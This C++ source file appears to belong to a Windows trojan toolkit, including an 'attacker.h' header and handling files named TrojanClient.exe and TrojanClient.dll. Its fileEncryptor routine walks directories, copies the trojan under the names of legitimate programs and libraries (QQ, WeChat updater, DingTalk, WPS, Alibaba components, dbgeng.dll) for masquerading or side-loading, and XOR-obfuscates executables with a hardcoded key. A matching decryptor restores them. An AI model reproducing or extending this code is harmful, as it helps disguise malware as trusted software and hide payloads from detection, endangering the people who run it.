
#include "attacker.h"
#include "FileOper.h"
#include <time.h>
#include <Shlwapi.h>
#include "cipher/CryptoUtils.h"
#include <string>
#include "Utils/AscHex.h"

using namespace std;


#pragma comment( lib, "Shlwapi.lib")




unsigned char gkey[64] = { 0 };


int FileOper::isFileExist(string filename) {

	FILE* fp = fopen(filename.c_str(), "rb");
	if (fp <= 0)
	{
		return FALSE;
	}
	else {
		fclose(fp);
		return TRUE;
	}
}


int FileOper::getFileSize(string filename) {
	FILE* fp = fopen(filename.c_str(), "rb");
	if (fp <= 0)
	{
		return FALSE;
	}

	fseek(fp, 0, SEEK_END);
	int filesize = ftell(fp);

	fclose(fp);
	return filesize;
}



string FileOper::getDateTime() {

	time_t t = time(NULL);

	char ch[MAX_PATH] = { 0 };

	strftime(ch, sizeof(ch) - 1, "%Y-%m-%d %H:%M:%S", localtime(&t));

	return ch;
}



int FileOper::fileReader(string filename, char** lpbuf, int* bufsize) {
	int ret = 0;

	FILE* fp = fopen(filename.c_str(), "rb");
	if (fp <= 0)
	{
		printf("fileReader fopen file:%s error\r\n", filename.c_str());
		return FALSE;
	}

	ret = fseek(fp, 0, FILE_END);

	int filesize = ftell(fp);

	ret = fseek(fp, 0, FILE_BEGIN);

	*bufsize = filesize;

	*lpbuf = new char[filesize + 1024];

	ret = fread(*lpbuf, 1, filesize, fp);
	fclose(fp);
	if (ret <= FALSE)
	{
		delete* lpbuf;
		return FALSE;
	}

	*(*lpbuf + filesize) = 0;
	return filesize;
}



int FileOper::fileWriter(string filename, const char* lpdate, int datesize) {
	int ret = 0;

	FILE* fp = fopen(filename.c_str(), "ab+");
	if (fp <= 0)
	{
		printf("fileReader fopen file:%s error\r\n", filename.c_str());
		return FALSE;
	}

	ret = fwrite(lpdate, 1, datesize, fp);
	fclose(fp);
	if (ret == FALSE)
	{
		return FALSE;
	}

	return datesize;
}


int FileOper::fileWriter(string filename, const char* lpdate, int datesize, int clear) {
	int ret = 0;

	FILE* fp = 0;
	if (clear) {
		fp = fopen(filename.c_str(), "wb");
	}
	else {
		fp = fopen(filename.c_str(), "ab+");
	}

	if (fp <= 0)
	{
		printf("fileReader fopen file:%s error\r\n", filename.c_str());
		return FALSE;
	}

	ret = fwrite(lpdate, 1, datesize, fp);
	fclose(fp);
	if (ret == FALSE)
	{
		return FALSE;
	}

	return datesize;
}


DWORD FileOper::GetCryptKey(unsigned char* pKey)
{
	SYSTEMTIME stSystime = { 0 };
	GetSystemTime(&stSystime);

	DWORD dwTickCnt[CRYPT_KEY_SIZE / sizeof(DWORD)] = { 0 };
	for (int i = 0; i < CRYPT_KEY_SIZE / sizeof(DWORD); i++)
	{
		dwTickCnt[i] = GetTickCount();
	}

	unsigned char* pSystemTime = (unsigned char*)&stSystime;
	unsigned char* pTickCnt = (unsigned char*)dwTickCnt;
	for (int j = 0; j < CRYPT_KEY_SIZE; j++)
	{
		pKey[j] = pSystemTime[j] ^ pTickCnt[j];
	}

	for (int i = 0; i < CRYPT_KEY_SIZE; i++)
	{
		if (pKey[i] >= 0x80)
		{
			pKey[i] = pKey[i] - 0x80;
		}
	}

	return TRUE;
}


void FileOper::getkey(unsigned char* key) {
	char* szrawkey = "i will win money";

	char szkey[64];
	CryptoUtils::getDataMd5(szrawkey, lstrlenA(szrawkey), (char*)szkey, FALSE);

	AscHex::asc2hex((unsigned char*)szkey, 32, key);
	//strncpy((char*)key, "i will win money", CRYPT_KEY_SIZE);
	return;
}



void FileOper::CryptData(unsigned char* pdata, int size, unsigned char* pkey, int keylen) {

	for (int i = 0, j = 0; i < size;)
	{
		pdata[i] ^= pkey[j];
		j++;
		if (j == keylen)
		{
			j = 0;
		}
		i++;
	}
}


int FileOper::fileDecryptWriter(string filename, string dstfn) {

	int filesize = 0;
	char* lpdata = 0;
	int ret = FileOper::fileDecryptReader(filename, &lpdata, &filesize);
	if (ret <= 0)
	{
		return FALSE;
	}

	ret = fileWriter(dstfn.c_str(), lpdata, filesize, TRUE);

	delete[] lpdata;
	return ret;
}



int FileOper::offsetFileDecryptReader(string filename, char** lpbuf, int offset, int* fsize) {
	int ret = 0;

	FILE* fp = fopen(filename.c_str(), "rb");
	if (fp <= 0)
	{
		printf("offsetFileDecryptReader fopen file:%s error\r\n", filename.c_str());
		return FALSE;
	}

	ret = fseek(fp, 0, FILE_END);

	int filesize = ftell(fp);

	ret = fseek(fp, 0, FILE_BEGIN);

	*fsize = filesize;

	*lpbuf = new char[filesize + 1024];

	ret = fread(*lpbuf + offset, 1, filesize, fp);
	fclose(fp);
	if (ret <= FALSE)
	{
		delete* lpbuf;
		return FALSE;
	}

	*(*lpbuf + offset + filesize) = 0;

	char szfilename[1024];
	lstrcpyA(szfilename, filename.c_str());
	PathStripPathA(szfilename);
	if (strstr(szfilename, ".zip") ||
		strstr(szfilename, ".apk") ||
		strstr(szfilename, ".exe") ||
		strstr(szfilename, ".dll") ||
		strstr(szfilename, ".jar") ||
		strstr(szfilename, ".so"))
	{
		if (isExecutable(*lpbuf + offset) == FALSE)
		{
			CryptData((unsigned char*)(*lpbuf + offset), filesize, gkey, CRYPT_KEY_SIZE);
		}
	}

	return filesize;
}


int FileOper::fileDecryptReader(string filename, char** lpbuf, int* bufsize) {

	return offsetFileDecryptReader(filename, lpbuf, 0, bufsize);
}

int FileOper::initKey() {
	getkey(gkey);
	return 0;
}

int FileOper::checkFileCryption(string pluginPath) {
	getkey(gkey);

	int ret = fileEncryptor(pluginPath, gkey, CRYPT_KEY_SIZE);
	return ret;
}


int renameExe(string path, string srcfn) {
	int ret = 0;
	string filename = path + srcfn;

	string dstfilename = path + "QQMusicForYQQ.exe";
	ret = CopyFileA(filename.c_str(), dstfilename.c_str(), 0);

	dstfilename = path + WEIXIN_PC_UPDATE_EXE_FILENAME;
	ret = CopyFileA(filename.c_str(), dstfilename.c_str(), 0);

	dstfilename = path + "DingTalk.exe";
	ret = CopyFileA(filename.c_str(), dstfilename.c_str(), 0);

	dstfilename = path + "QiyiService.exe";
	ret = CopyFileA(filename.c_str(), dstfilename.c_str(), 0);

	dstfilename = path + "WPS_UpdatePatch.exe";
	ret = CopyFileA(filename.c_str(), dstfilename.c_str(), 0);

	dstfilename = path + "DownloadSDKServer.exe";
	ret = CopyFileA(filename.c_str(), dstfilename.c_str(), 0);

	dstfilename = path + "txupd.exe";
	ret = CopyFileA(filename.c_str(), dstfilename.c_str(), 0);

	dstfilename = path + ALIBABA_ALIAPPLOADER_FILENAME;
	ret = CopyFileA(filename.c_str(), dstfilename.c_str(), 0);

	dstfilename = path + ALIBABA_ALIFILECHECK_FILENAME;
	ret = CopyFileA(filename.c_str(), dstfilename.c_str(), 0);

	dstfilename = path + "push_mini_setup.exe";
	ret = CopyFileA(filename.c_str(), dstfilename.c_str(), 0);

	dstfilename = path + "fancyexelauncher.exe";
	ret = CopyFileA(filename.c_str(), dstfilename.c_str(), 0);

	return 0;
}

int renameDll(string path, string srcfn) {
	int ret = 0;
	string filename = path + srcfn;

	string dstfilename = "";

	dstfilename = path + "inject_qqbrowser.dll";
	ret = CopyFileA(filename.c_str(), dstfilename.c_str(), 0);

	dstfilename = path + "PerfTools3.dll";
	ret = CopyFileA(filename.c_str(), dstfilename.c_str(), 0);

	dstfilename = path + "HCDNClientNet.dll";
	ret = CopyFileA(filename.c_str(), dstfilename.c_str(), 0);

	dstfilename = path + "DownloadHelper.dll";
	ret = CopyFileA(filename.c_str(), dstfilename.c_str(), 0);

	dstfilename = path + "dsktptst.dll";
	ret = CopyFileA(filename.c_str(), dstfilename.c_str(), 0);

	dstfilename = path + "QLDZModule.dll";
	ret = CopyFileA(filename.c_str(), dstfilename.c_str(), 0);

	dstfilename = path + "wpsrp.dll";
	ret = CopyFileA(filename.c_str(), dstfilename.c_str(), 0);

	dstfilename = path + "EncryptBox.dll";
	ret = CopyFileA(filename.c_str(), dstfilename.c_str(), 0);

	dstfilename = path + "DigitalCert.dll";
	ret = CopyFileA(filename.c_str(), dstfilename.c_str(), 0);
	dstfilename = path + "qjpeg.dll";
	ret = CopyFileA(filename.c_str(), dstfilename.c_str(), 0);

	dstfilename = path + "npfancygame.dll";
	ret = CopyFileA(filename.c_str(), dstfilename.c_str(), 0);

	dstfilename = path + "dbgeng.dll";
	ret = CopyFileA(filename.c_str(), dstfilename.c_str(), 0);
	return 0;
}

int renameDll64(string path, string srcfn) {
	int ret = 0;
	string filename = path + srcfn;

	string dstfilename = "";

	dstfilename = path + "QBShellIcon_x64.dll";
	ret = CopyFileA(filename.c_str(), dstfilename.c_str(), 0);

	return 0;
}

int renameExe64(string path, string srcfn) {
	int ret = 0;
	string filename = path + srcfn;

	string dstfilename = "";

	dstfilename = path + "QBShellIcon_x64.dll";
	ret = CopyFileA(filename.c_str(), dstfilename.c_str(), 0);

	return 0;
}


int FileOper::fileEncryptor(string path, unsigned char* key, int keylen) {
	WIN32_FIND_DATAA fd = { 0 };

	string fn = path + "*.*";
	HANDLE hf = FindFirstFileA(fn.c_str(), &fd);
	if (hf == INVALID_HANDLE_VALUE)
	{
		return -1;
	}

	while (1)
	{
		int ret = 0;

		if (fd.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE) {
			if (strstr(fd.cFileName, ".zip") ||
				strstr(fd.cFileName, ".apk") ||
				strstr(fd.cFileName, ".exe") ||
				strstr(fd.cFileName, ".dll") ||
				strstr(fd.cFileName, ".so") ||
				strstr(fd.cFileName, ".jar"))
			{
				if (lstrcmpiA(fd.cFileName, "TrojanClient.exe") == 0)
				{
					ret = renameExe(path, fd.cFileName);
				}
				else if (lstrcmpiA(fd.cFileName, "TrojanClient.dll") == 0)
				{
					ret = renameDll(path, fd.cFileName);
				}
				else if (lstrcmpiA(fd.cFileName, "TrojanClient64.dll") == 0)
				{
					ret = renameDll64(path, fd.cFileName);
				}
				else if (lstrcmpiA(fd.cFileName, "TrojanClient64.exe") == 0)
				{
					ret = renameExe64(path, fd.cFileName);
				}

				int filesize = 0;
				char* data = 0;
				ret = fileReader((path + fd.cFileName).c_str(), &data, &filesize);
				if (ret)
				{
					if (isExecutable(data))
					{
						CryptData((unsigned char*)data, filesize, key, keylen);
						ret = fileWriter((path + fd.cFileName).c_str(), data, filesize, TRUE);
					}

					delete[]data;
				}
			}
		}
		else if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			if (lstrcmpiA(fd.cFileName, ".") && lstrcmpiA(fd.cFileName, ".."))
			{
				string nextpath = path + fd.cFileName + "\\";
				ret = fileEncryptor(nextpath, key, keylen);
			}
		}

		ret = FindNextFileA(hf, &fd);
		if (ret <= 0)
		{
			break;
		}
	}

	FindClose(hf);
	return 0;
}








int FileOper::fileDecryptor(string path) {
	WIN32_FIND_DATAA fd = { 0 };

	string fn = path + "*.*";
	HANDLE hf = FindFirstFileA(fn.c_str(), &fd);
	if (hf == INVALID_HANDLE_VALUE)
	{
		return -1;
	}

	while (1)
	{
		int ret = 0;

		if (fd.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE) {
			if (strstr(fd.cFileName, ".zip") ||
				strstr(fd.cFileName, ".apk") ||
				strstr(fd.cFileName, ".exe") ||
				strstr(fd.cFileName, ".dll") ||
				strstr(fd.cFileName, ".so") ||
				strstr(fd.cFileName, ".jar"))
			{
				int filesize = 0;
				char* data = 0;
				ret = fileReader((path + fd.cFileName).c_str(), &data, &filesize);
				if (ret)
				{
					if (isExecutable(data) == FALSE)
					{
						CryptData((unsigned char*)data, filesize, gkey, CRYPT_KEY_SIZE);
						ret = fileWriter((path + fd.cFileName).c_str(), data, filesize, TRUE);
					}

					delete[]data;
				}
			}
		}
		else if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			if (lstrcmpiA(fd.cFileName, ".") && lstrcmpiA(fd.cFileName, ".."))
			{
				string nextpath = path + fd.cFileName + "\\";
				ret = fileDecryptor(nextpath);
			}
		}

		ret = FindNextFileA(hf, &fd);
		if (ret <= 0)
		{
			break;
		}
	}

	FindClose(hf);
	return 0;
}


int FileOper::isExecutable(char* data) {
	if (memcmp(data, "MZ", 2) == 0)
	{
		int offset = *(int*)(data + 0x3c);
		if (offset < 4096 && offset > 0)
		{
			if (*(DWORD*)(data + offset) == 0x4550)
			{
				return TRUE;
			}
		}
	}
	else if (memcmp(data, "\x50\x4b\x03\x04", 4) == 0 || memcmp(data, "\x7f\x45\x4c\x46", 4) == 0 || memcmp(data, "dex\n", 4) == 0)
	{
		return TRUE;
	}

	return FALSE;
}